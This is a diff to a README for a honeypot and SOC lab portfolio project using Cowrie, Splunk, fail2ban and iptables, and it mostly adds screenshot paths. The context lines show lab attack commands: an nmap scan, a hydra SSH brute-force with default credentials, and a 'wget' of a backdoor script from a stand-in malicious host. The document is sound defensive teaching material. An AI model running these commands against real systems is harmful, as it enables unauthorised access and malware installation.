@@ -2,7 +2,7 @@
 
 A comprehensive Security Operations Center (SOC) project demonstrating threat detection, log analysis, and automated defense mechanisms using enterprise security tools.
 
-![Project Architecture]()
+![Project Architecture](screenshots/01-architecture/architecture.png)
 
 ## 🎯 Project Overview
 
@@ -166,7 +166,7 @@ nmap -sV -p 1-1000
 - Port 22 (SSH) open
 - Service: OpenSSH 8.9p1
 
-![Nmap Scan]()
+![Nmap Scan](screenshots/02-attacks/nmap-command.png)
 
 ---
 
@@ -186,10 +186,7 @@ hydra -L usernames.txt -P passwords.txt ssh:// -t 4 -V
   - admin/admin
   - ubuntu/ubuntu
 
-![Hydra Brute Force]()
-
-**Splunk Detection:**
-![Login Spike]()
+![Hydra Brute Force](screenshots/02-attacks/hydra-command-running.png)
 
 ---
 
@@ -207,9 +204,6 @@ netstat -tulpn
 wget http://malicious-site.com/backdoor.sh
 ```
 
-**Cowrie captured all commands:**
-![Commands Executed]()
-
 ---
 
 ## 🛡️ Defense Implementation
@@ -224,7 +218,7 @@ sudo netfilter-persistent save
 
 **Result:** All traffic from attacker blocked immediately.
 
-![iptables Block]()
+![iptables Block](screenshots/04-defenses/iptables-block.png)
 
 ---
 
@@ -255,10 +249,10 @@ failregex = .*"eventid":"cowrie\.login\.failed".*"src_ip":""
 
 **Result:** Attacker IP automatically banned after 5 failed attempts.
 
-![Fail2ban Active]()
+![Fail2ban Active](screenshots/04-defenses/fail2ban-after.png)
 
 **Re-attack Blocked:**
-![Attack Blocked]()
+![Attack Blocked](screenshots/04-defenses/attack-blocked.png)
 
 ---
 
@@ -275,8 +269,6 @@ failregex = .*"eventid":"cowrie\.login\.failed".*"src_ip":""
 7. **Successful Logins** (Table)
 8. **Commands Executed by Attacker** (Table)
 
-![Splunk Dashboard]()
-
 ### Configured Alerts
 
 | Alert Name | Severity | Condition | Action |
@@ -286,7 +278,7 @@ failregex = .*"eventid":"cowrie\.login\.failed".*"src_ip":""
 | Port Scan Detected | High | >5 connections from single IP | Add to Triggered Alerts |
 | Unknown IP Accessing Honeypot | Medium | New IP with <3 connections | Add to Triggered Alerts |
 
-![Alerts Firing]()
+![Alerts Firing](screenshots/04-defenses/triggered_alerts.png)
 
 ---
 
@@ -324,21 +316,21 @@ failregex = .*"eventid":"cowrie\.login\.failed".*"src_ip":""
 
 ---
 
+## 🔒 Data Sanitization
+
+All packet captures have been sanitized:
+- IP addresses anonymized to RFC1918 ranges
+- MAC addresses replaced with generic identifiers
+- No personally identifiable information included
+
+---
+
 ## 👤 Author
 
 **Ahmad Bussti**
 - LinkedIn: https://www.linkedin.com/in/ahmad-bussti-7bb574359/
 - Portfolio: https://github.com/abussti
 - Email: abussti@gmail.com
-
----
-
-## 🙏 Acknowledgments
-
-- Cowrie honeypot project
-- Splunk community
-- Kali Linux team
-- WireGuard developers
 
 ---
 
